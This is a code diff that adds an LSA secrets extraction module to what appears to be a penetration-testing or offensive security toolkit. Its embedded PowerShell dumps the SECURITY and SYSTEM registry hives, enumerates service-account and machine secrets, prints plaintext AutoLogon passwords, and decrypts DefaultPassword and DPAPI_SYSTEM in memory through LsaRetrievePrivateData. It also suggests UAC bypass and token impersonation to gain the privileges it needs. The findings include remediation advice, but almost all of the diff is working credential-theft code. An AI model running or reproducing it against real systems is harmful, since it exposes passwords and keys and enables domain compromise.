@@ -3368,3 +3368,225 @@ if ('${action}' -eq 'export') {
 
   return { output: output.join("\n"), findings }
 }
+
+export async function lsaSecrets(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "dump"
+  const outdir = argVal(args, "--outdir") || `${process.env.TEMP || "C:\\Windows\\Temp"}\\cs-lsa-${Date.now()}`
+  const findings: Finding[] = []
+  const output: string[] = ["[*] LSA Secrets extraction...\n"]
+
+  if (action === "dump") {
+    const script = `
+$ErrorActionPreference = 'SilentlyContinue'
+Write-Output "=== LSA Secrets Extraction ==="
+Write-Output ""
+
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+    Write-Output "[!] ERROR: LSA secret extraction requires Administrator privileges"
+    Write-Output "[*] Try: token_impersonate or uac_bypass first"
+    exit 1
+}
+
+Write-Output "[*] Saving SECURITY and SYSTEM hives for offline extraction..."
+$outDir = '${outdir}'
+New-Item -ItemType Directory -Path $outDir -Force | Out-Null
+
+reg save HKLM\\SECURITY "$outDir\\SECURITY" /y 2>$null
+reg save HKLM\\SYSTEM "$outDir\\SYSTEM" /y 2>$null
+
+if ((Test-Path "$outDir\\SECURITY") -and (Test-Path "$outDir\\SYSTEM")) {
+    Write-Output "[+] SECURITY hive saved: $outDir\\SECURITY"
+    Write-Output "[+] SYSTEM hive saved: $outDir\\SYSTEM"
+    Write-Output "[*] Extract with: secretsdump.py -security SECURITY -system SYSTEM LOCAL"
+} else {
+    Write-Output "[-] Failed to save hives — trying in-memory extraction"
+}
+
+Write-Output ""
+Write-Output "=== In-Memory LSA Secret Enumeration ==="
+
+Write-Output "[*] Enumerating LSA secret key names..."
+$secretKeys = Get-ChildItem "HKLM:\\SECURITY\\Policy\\Secrets" -ErrorAction SilentlyContinue
+if ($secretKeys) {
+    Write-Output "[+] Found $($secretKeys.Count) LSA secret entries:"
+    Write-Output ""
+    foreach ($key in $secretKeys) {
+        $name = Split-Path $key.Name -Leaf
+        $desc = switch -Wildcard ($name) {
+            'DPAPI_SYSTEM'      { 'DPAPI system master key — decrypts machine-level DPAPI secrets' }
+            '$MACHINE.ACC'      { 'Machine account password — domain computer credential' }
+            'NL$KM'             { 'Cached credential encryption key — decrypts DCC2 hashes' }
+            'DefaultPassword'   { '!!! AutoLogon password — plaintext domain/local password !!!' }
+            '_SC_*'             { "Service account password — $($name.Replace('_SC_','')) service credential" }
+            'L$_ASP_DAP*'       { 'IIS application pool credential' }
+            'L$RTMTIMEBOMB*'    { 'Windows activation grace period timer' }
+            'L$*'               { "Cached secret — $name" }
+            'M$*'               { "Machine secret — $name" }
+            default             { 'Unknown secret type' }
+        }
+        $risk = if ($name -match 'DefaultPassword|MACHINE\.ACC|_SC_|DPAPI_SYSTEM|NL\$KM') { 'HIGH' } else { 'LOW' }
+        Write-Output "    [$risk] $name"
+        Write-Output "         $desc"
+    }
+} else {
+    Write-Output "[-] Cannot enumerate secret keys — insufficient permissions or path not found"
+}
+
+Write-Output ""
+Write-Output "=== AutoLogon Credentials ==="
+$regPath = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
+$defaultUser = (Get-ItemProperty $regPath -ErrorAction SilentlyContinue).DefaultUserName
+$defaultPass = (Get-ItemProperty $regPath -ErrorAction SilentlyContinue).DefaultPassword
+$defaultDomain = (Get-ItemProperty $regPath -ErrorAction SilentlyContinue).DefaultDomainName
+$autoLogon = (Get-ItemProperty $regPath -ErrorAction SilentlyContinue).AutoAdminLogon
+
+if ($defaultPass) {
+    Write-Output "[!!!] AutoLogon credentials found in registry:"
+    Write-Output "    Domain:   $defaultDomain"
+    Write-Output "    User:     $defaultUser"
+    Write-Output "    Password: $defaultPass"
+    Write-Output "    AutoLogon: $autoLogon"
+} elseif ($defaultUser) {
+    Write-Output "[*] AutoLogon user configured but password stored in LSA secret (DefaultPassword)"
+    Write-Output "    User: $defaultDomain\\$defaultUser"
+    Write-Output "    AutoLogon: $autoLogon"
+} else {
+    Write-Output "[-] No AutoLogon configured"
+}
+
+Write-Output ""
+Write-Output "=== Service Account Secrets ==="
+$serviceSecrets = $secretKeys | Where-Object { (Split-Path $_.Name -Leaf) -match '^_SC_' }
+if ($serviceSecrets) {
+    Write-Output "[!] Service account credentials ($($serviceSecrets.Count) found):"
+    foreach ($s in $serviceSecrets) {
+        $svcName = (Split-Path $s.Name -Leaf).Replace('_SC_', '')
+        $svc = Get-WmiObject Win32_Service -Filter "Name='$svcName'" -ErrorAction SilentlyContinue
+        Write-Output "    Service: $svcName"
+        Write-Output "    RunAs:   $(if ($svc) { $svc.StartName } else { 'Unknown' })"
+        Write-Output "    Status:  $(if ($svc) { $svc.State } else { 'Unknown' })"
+        Write-Output ""
+    }
+    Write-Output "[*] Decrypt with: secretsdump.py -security SECURITY -system SYSTEM LOCAL"
+} else {
+    Write-Output "[-] No service account secrets found"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-CRED-020",
+      provider: "windows",
+      severity: r.stdout.includes("!!!") ? "critical" : "high",
+      status: r.stdout.includes("hive saved") ? "EXECUTED" : "FAILED",
+      resource: "lsa://secrets",
+      title: "LSA Secrets extraction — service account passwords, DPAPI keys, machine account",
+      details: r.stdout.substring(0, 500),
+      remediation: "Use gMSA for service accounts. Disable AutoLogon. Restrict local admin access. Monitor registry hive access (Event ID 4663).",
+    })
+  }
+
+  if (action === "decrypt") {
+    const script = `
+Write-Output "=== LSA Secret Decryption (In-Memory) ==="
+Write-Output ""
+
+Add-Type @'
+using System;
+using System.Runtime.InteropServices;
+
+public class LsaUtil {
+    [StructLayout(LayoutKind.Sequential)]
+    public struct LSA_UNICODE_STRING {
+        public ushort Length;
+        public ushort MaximumLength;
+        public IntPtr Buffer;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct LSA_OBJECT_ATTRIBUTES {
+        public uint Length;
+        public IntPtr RootDirectory;
+        public IntPtr ObjectName;
+        public uint Attributes;
+        public IntPtr SecurityDescriptor;
+        public IntPtr SecurityQualityOfService;
+    }
+
+    [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
+    public static extern uint LsaOpenPolicy(
+        ref LSA_UNICODE_STRING SystemName,
+        ref LSA_OBJECT_ATTRIBUTES ObjectAttributes,
+        uint DesiredAccess,
+        out IntPtr PolicyHandle);
+
+    [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
+    public static extern uint LsaRetrievePrivateData(
+        IntPtr PolicyHandle,
+        ref LSA_UNICODE_STRING KeyName,
+        out IntPtr PrivateData);
+
+    [DllImport("advapi32.dll")]
+    public static extern uint LsaClose(IntPtr ObjectHandle);
+
+    [DllImport("advapi32.dll")]
+    public static extern uint LsaFreeMemory(IntPtr Buffer);
+}
+'@
+
+$objectAttributes = New-Object LsaUtil+LSA_OBJECT_ATTRIBUTES
+$objectAttributes.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($objectAttributes)
+$systemName = New-Object LsaUtil+LSA_UNICODE_STRING
+$policyHandle = [IntPtr]::Zero
+
+$status = [LsaUtil]::LsaOpenPolicy([ref]$systemName, [ref]$objectAttributes, 0x00000004, [ref]$policyHandle)
+if ($status -ne 0) {
+    Write-Output "[-] LsaOpenPolicy failed (0x$('{0:X8}' -f $status)) — need SYSTEM or equivalent"
+    Write-Output "[*] Try: psexec -s powershell, or use token_impersonate to get SYSTEM first"
+    exit 1
+}
+
+$targetKeys = @('DefaultPassword', 'DPAPI_SYSTEM')
+foreach ($keyName in $targetKeys) {
+    $lsaKeyName = New-Object LsaUtil+LSA_UNICODE_STRING
+    $lsaKeyName.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($keyName)
+    $lsaKeyName.Length = [uint16]($keyName.Length * 2)
+    $lsaKeyName.MaximumLength = [uint16](($keyName.Length + 1) * 2)
+
+    $privateData = [IntPtr]::Zero
+    $status = [LsaUtil]::LsaRetrievePrivateData($policyHandle, [ref]$lsaKeyName, [ref]$privateData)
+
+    if ($status -eq 0 -and $privateData -ne [IntPtr]::Zero) {
+        $lsaData = [System.Runtime.InteropServices.Marshal]::PtrToStructure($privateData, [Type][LsaUtil+LSA_UNICODE_STRING])
+        if ($lsaData.Length -gt 0) {
+            $value = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($lsaData.Buffer, $lsaData.Length / 2)
+            Write-Output "[!!!] $keyName = $value"
+        }
+        [LsaUtil]::LsaFreeMemory($privateData) | Out-Null
+    } else {
+        Write-Output "[-] $keyName — not found or access denied"
+    }
+    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($lsaKeyName.Buffer)
+}
+
+[LsaUtil]::LsaClose($policyHandle) | Out-Null
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-CRED-021",
+      provider: "windows",
+      severity: "critical",
+      status: r.stdout.includes("!!!") ? "EXECUTED" : "FAILED",
+      resource: "lsa://decrypt",
+      title: "LSA Secret in-memory decryption via LsaRetrievePrivateData",
+      details: r.stdout.substring(0, 500),
+      remediation: "Restrict SYSTEM-level access. Enable Credential Guard. Monitor for LsaRetrievePrivateData API calls.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
